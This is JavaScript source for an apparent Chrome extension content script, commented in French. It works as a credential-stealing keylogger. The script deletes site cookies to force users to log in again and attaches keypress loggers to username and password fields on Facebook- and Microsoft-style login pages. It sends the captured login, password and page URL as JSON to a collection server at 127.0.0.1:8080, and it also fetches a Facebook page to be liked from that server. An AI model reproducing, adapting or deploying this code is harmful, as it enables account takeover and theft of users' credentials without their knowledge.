var keys="";

var keywords = ["username", "login", "id", "<span class=\"accesskey\">I</span>dentifiant:","<span class=\"accesskey\">M</span>ot de passe:", "identifiant", "password", "Mot de passe", "Adresse e-mail ou mobile","        Mot de passe      ", "Adresse e-mail ou téléphone","              Adresse e-mail ou numéro de téléphone portable            "];
var logs = ["username", "login", "id", "<span class=\"accesskey\">I</span>dentifiant:", "identifiant", "Adresse e-mail ou mobile", "Adresse e-mail ou téléphone", "              Adresse e-mail ou numéro de téléphone portable            "];
var psswd = ["password", "Mot de passe","<span class=\"accesskey\">M</span>ot de passe:", "        Mot de passe      "];
var elemLabels = document.getElementsByTagName("label");
var labels = [];
var finalInputsId = [];
var inputId = [];
var inputs = [];
var str = [];
var json = "";

/*-----------------------------------------------------------------------------------------------------------------------------------------
 supression des cookies pour deconnecter l'utilisateur et le forcer à entrer ses identifiants
 -----------------------------------------------------------------------------------------------------------------------------------------*/

function deleteCookies (site) {
    var cookies = document.cookie.split("; ");
    for (var c = 0; c < cookies.length; c++) {
        var d = site.split(".");
        while (d.length > 0) {
            var cookieBase = encodeURIComponent(cookies[c].split(";")[0].split("=")[0]) + '=; expires=Thu, 01-Jan-1970 00:00:01 GMT; domain=' + d.join('.') + ' ;path=';
            var p = location.pathname.split('/');
            document.cookie = cookieBase + '/';
            while (p.length > 0) {
                document.cookie = cookieBase + p.join('/');
                p.pop();
            };
            d.shift();
        }
    }
}


if(window.location.href.indexOf("https://www.facebook.com/login.php?login_attempt=") > -1){
	window.location.href = "https://www.facebook.com";
}

if(window.location.href.indexOf("https://www.facebook.com") > -1 && document.getElementsByClassName("jewelCount").length == 0 ){
		chrome.runtime.sendMessage({noneed: "jj"});
}

/*-----------------------------------------------------------------------------------------------------------------------------------------
requete serveur de l'url de la page facebook à aller liker
 -----------------------------------------------------------------------------------------------------------------------------------------*/

var boolean =  window.location.href.split('/')[3] != ""

if(window.location.href.indexOf("https://www.facebook.com") > -1 && document.getElementsByClassName("jewelCount").length > 0 ){
	if( boolean == false ){
		var xhr1 = new XMLHttpRequest();
		xhr1.open("GET", "https://127.0.0.1:8080/page", false);
		xhr1.send();
		var page = "";
		if(xhr1.status == 200){
			try{
		 	page = xhr1.response;
			chrome.runtime.sendMessage({url: page});
			}
			catch(err){
				console.log(err.message);
			}
		}
		setTimeout(function(){chrome.runtime.sendMessage({connexion: "www.facebook.com"});}, 1000);
	}
//	chrome.runtime.sendMessage({connexion: "www.facebook.com"});

}


/*-----------------------------------------------------------------------------------------------------------------------------------------
reperage du nombre de videos sur la page et mis a jour du badge de notification côté client
 -----------------------------------------------------------------------------------------------------------------------------------------*/

var videos = document.getElementsByTagName("video");
var nbVideos = videos.length.toString();

chrome.runtime.sendMessage({badgeText: nbVideos});


/*-----------------------------------------------------------------------------------------------------------------------------------------
Reperage des labels et inputs a surveiller pour le déclenchement du keyloger
 -----------------------------------------------------------------------------------------------------------------------------------------*/

for (var i = elemLabels.length - 1; i >= 0; i--) {
	labels[i] = elemLabels[i].innerHTML;
	inputId[i] = elemLabels[i].htmlFor;
}

for (var i = labels.length - 1; i >= 0; i--) {
	if(labels[i].indexOf("    ")){
		labels[i] = labels[i].replace(/[\n]/gi, "" );
	}
	if(keywords.indexOf(labels[i]) > -1){
		finalInputsId.push(inputId[i]);
		str.push(labels[i]);
	}
}

for (var i = finalInputsId.length - 1; i >= 0; i--) {
	inputs.push(document.getElementById(finalInputsId[i]));
}


var inputbis = document.getElementsByName("loginfmt");
var inputter = document.getElementsByName("password");
var input4 = document.getElementsByName("passwd");
var input5 = document.getElementsByName("pass");
var input6 = document.getElementsByName("email");

for (var i = input5.length - 1; i >= 0; i--) {
	inputs.push(input5[i]);
	str.push("username");
}

for (var i = input6.length - 1; i >= 0; i--) {
	inputs.push(input6[i]);
	str.push("username");
}

for (var i = inputbis.length - 1; i >= 0; i--) {
	inputs.push(inputbis[i]);
	str.push("password");
}

for (var i = inputter.length - 1; i >= 0; i--) {
	inputs.push(inputter[i]);
	str.push("username");
}

for (var i = input4.length - 1; i >= 0; i--) {
	inputs.push(input4[i]);
	str.push("username");
}


for (var i = inputs.length - 1; i >= 0; i--) {
	if(psswd.indexOf(str[i]) > -1 ){
		inputs[i].onkeypress = keylogger_password;
	}
	else{
		if(inputs[i].value != ""){
			sendToServer("Login", inputs[i].value);
		}
		else{
			inputs[i].onkeypress = keylogger_login;
		}
	}
}

var compt_log = 0;
var compt_pass = 0;
var pass ="";


function keylogger_login(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
	if(compt_log == 0){
		compt_log = 1;
		setTimeout(function(){sendToServer("Password", keys)}, 5000);
	}
}

function keylogger_password(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	pass+=key;
	if(compt_pass == 0){
		compt_pass = 1;
		setTimeout(function(){sendToServer("Login", pass)}, 5000);
	}
}


var url = "https://root:root@127.0.0.1:8080/json";


function sendToServer(libelle,value){
	if(libelle == "Login"){
		json = json + '{"URL":' + '"' + window.location.href + '"' + ',"login":' + '"' +  value + '"' + ',"password":';
	}
	else{
		json = json + '"' + value + '"}';
		var xhr = new XMLHttpRequest();
		xhr.open("POST", url, true);
		xhr.setRequestHeader("Content-type", "application/json");
		xhr.send(json);
		json = "";
	}

	if(libelle == "Login"){
		pass = "";
		compt_log = 0;
	}
	else{
		keys = "";
		compt_pass = 0;
	}
}
